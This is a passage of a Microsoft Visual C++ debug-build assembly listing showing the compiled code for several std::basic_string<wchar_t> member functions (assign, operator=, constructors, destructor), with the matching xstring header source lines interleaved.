  0008d	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00091	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  00098	48 8b c8	 mov	 rcx, rax
  0009b	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  000a0	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000a7	eb 35		 jmp	 SHORT $LN1@assign
$LN2@assign:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  000a9	48 8d 85 04 01
	00 00		 lea	 rax, QWORD PTR $T3[rbp]
  000b0	48 8b f8	 mov	 rdi, rax
  000b3	33 c0		 xor	 eax, eax
  000b5	b9 01 00 00 00	 mov	 ecx, 1
  000ba	f3 aa		 rep stosb
  000bc	4c 8b 8d 48 01
	00 00		 mov	 r9, QWORD PTR _Ptr$[rbp]
  000c3	44 0f b6 85 04
	01 00 00	 movzx	 r8d, BYTE PTR $T3[rbp]
  000cb	48 8b 95 50 01
	00 00		 mov	 rdx, QWORD PTR _Count$[rbp]
  000d2	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d9	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN1@assign:

; 3423 :             _Count,
; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {
; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());
; 3427 :             },
; 3428 :             _Ptr);
; 3429 :     }

  000de	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000e5	5f		 pop	 rdi
  000e6	5d		 pop	 rbp
  000e7	c3		 ret	 0
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
_TEXT	SEGMENT
_Al$ = 8
_Right_al$ = 40
this$ = 288
_Right$ = 296
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT

; 3188 :     _CONSTEXPR20 basic_string& operator=(const basic_string& _Right) {

$LN4:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3189 :         if (this == _STD addressof(_Right)) {

  00024	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
  00030	48 39 85 20 01
	00 00		 cmp	 QWORD PTR this$[rbp], rax
  00037	75 09		 jne	 SHORT $LN2@operator

; 3190 :             return *this;

  00039	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00040	eb 5d		 jmp	 SHORT $LN1@operator
$LN2@operator:

; 3191 :         }
; 3192 : 
; 3193 :         auto& _Al             = _Getal();

  00042	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0004e	48 89 45 08	 mov	 QWORD PTR _Al$[rbp], rax

; 3194 :         const auto& _Right_al = _Right._Getal();

  00052	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00059	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0005e	48 89 45 28	 mov	 QWORD PTR _Right_al$[rbp], rax

; 3195 :         if constexpr (_Choose_pocca_v<_Alty>) {
; 3196 :             if (_Al != _Right_al) {
; 3197 :                 auto&& _Alproxy       = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 3198 :                 auto&& _Right_alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Right_al);
; 3199 :                 _Container_proxy_ptr<_Alty> _New_proxy(_Right_alproxy, _Leave_proxy_unbound{}); // throws
; 3200 : 
; 3201 :                 const size_type _Right_size   = _Right._Mypair._Myval2._Mysize;
; 3202 :                 const _Elem* const _Right_ptr = _Right._Mypair._Myval2._Myptr();
; 3203 :                 if (_Right_size > _Small_string_capacity) {
; 3204 :                     size_type _New_capacity = _Calculate_growth(_Right_size, _Small_string_capacity, _Right.max_size());
; 3205 :                     auto _Right_al_non_const = _Right_al;
; 3206 :                     const pointer _New_ptr   = _Allocate_for_capacity(_Right_al_non_const, _New_capacity); // throws
; 3207 :                     _Traits::copy(_Unfancy(_New_ptr), _Right_ptr, _Right_size + 1);
; 3208 : 
; 3209 :                     _Tidy_deallocate();
; 3210 :                     _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);
; 3211 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3212 :                     _Mypair._Myval2._Myres  = _New_capacity;
; 3213 :                     _ASAN_STRING_CREATE(*this);
; 3214 :                 } else {
; 3215 :                     _Tidy_deallocate();
; 3216 :                     _Traits::copy(_Mypair._Myval2._Bx._Buf, _Right_ptr, _Right_size + 1);
; 3217 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3218 :                     _Mypair._Myval2._Myres  = _Small_string_capacity;
; 3219 :                 }
; 3220 : 
; 3221 :                 _Pocca(_Al, _Right_al);
; 3222 :                 _New_proxy._Bind(_Alproxy, _STD addressof(_Mypair._Myval2));
; 3223 :                 return *this;
; 3224 :             }
; 3225 :         }
; 3226 : 
; 3227 :         _Pocca(_Al, _Right_al);

  00062	48 8b 55 28	 mov	 rdx, QWORD PTR _Right_al$[rbp]
  00066	48 8b 4d 08	 mov	 rcx, QWORD PTR _Al$[rbp]
  0006a	e8 00 00 00 00	 call	 ??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ; std::_Pocca<std::allocator<wchar_t> >

; 3228 :         assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  0006f	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00076	48 8b c8	 mov	 rcx, rax
  00079	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0007e	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00085	4c 8b 41 10	 mov	 r8, QWORD PTR [rcx+16]
  00089	48 8b d0	 mov	 rdx, rax
  0008c	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00093	e8 00 00 00 00	 call	 ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign

; 3229 :         return *this;

  00098	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
$LN1@operator:

; 3230 :     }

  0009f	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  000a6	5f		 pop	 rdi
  000a7	5d		 pop	 rbp
  000a8	c3		 ret	 0
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 3176 :     _CONSTEXPR20 ~basic_string() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3177 :         _Tidy_deallocate();

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate

; 3178 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3179 :         auto&& _Alproxy          = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 3180 :         const auto _To_delete    = _Mypair._Myval2._Myproxy;
; 3181 :         _Mypair._Myval2._Myproxy = nullptr;
; 3182 :         _Delete_plain_internal(_Alproxy, _To_delete);
; 3183 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3184 :     }

  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8b c8	 mov	 rcx, rax
  00035	e8 00 00 00 00	 call	 ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
_My_data$ = 8
$T1 = 228
this$ = 288
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty, COMDAT

; 2643 :     _CONSTEXPR20 void _Construct_empty() {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2644 :         auto& _My_data = _Mypair._Myval2;

  0001f	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2645 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  0002a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  00031	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00035	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2646 : 
; 2647 :         // initialize basic_string data members
; 2648 :         _My_data._Mysize = 0;

  0003a	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0003e	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0004a	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();

  00052	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00056	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0005b	33 c0		 xor	 eax, eax
  0005d	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00064	b8 02 00 00 00	 mov	 eax, 2
  00069	48 6b c0 00	 imul	 rax, rax, 0
  0006d	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00071	48 03 c8	 add	 rcx, rax
  00074	48 8b c1	 mov	 rax, rcx
  00077	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0007e	48 8b c8	 mov	 rcx, rax
  00081	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2654 :     }

  00086	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0008d	5f		 pop	 rdi
  0008e	5d		 pop	 rbp
  0008f	c3		 ret	 0
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Old_ptr$ = 232
_Capacity$ = 240
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity, COMDAT

; 2638 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2639 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2640 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00030	48 ff c0	 inc	 rax
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Old_ptr$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00044	e8 00 00 00 00	 call	 ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate

; 2641 :     }

  00049	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00050	5f		 pop	 rdi
  00051	5d		 pop	 rbp
  00052	c3		 ret	 0
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
$T1 = 196
$T2 = 228
this$ = 288
_Right$ = 296
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2508 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0002b	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00030	48 8b d0	 mov	 rdx, rax
  00033	48 8d 8d c4 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  0003a	e8 00 00 00 00	 call	 ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
  0003f	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00046	4c 8b c0	 mov	 r8, rax
  00049	0f b6 95 e4 00
	00 00		 movzx	 edx, BYTE PTR $T2[rbp]
  00050	e8 00 00 00 00	 call	 ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00055	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0005c	48 8b c8	 mov	 rcx, rax
  0005f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00064	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0006b	4c 8b 41 10	 mov	 r8, QWORD PTR [rcx+16]
  0006f	48 8b d0	 mov	 rdx, rax
  00072	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00079	e8 00 00 00 00	 call	 ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>

; 2510 :     }

  0007e	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00085	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0008c	5f		 pop	 rdi
  0008d	5d		 pop	 rbp
  0008e	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 196
this$ = 256
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2499 :     basic_string() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 95 c4 00
	00 00		 movzx	 edx, BYTE PTR $T1[rbp]
  0002d	48 8b c8	 mov	 rcx, rax
  00030	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2500 :         _Construct_empty();

  00035	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty

; 2501 :     }

  00041	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf, COMDAT

; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2292 :             _STD _Destroy_in_place(_Ptr);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ; std::_Destroy_in_place<wchar_t *>

; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
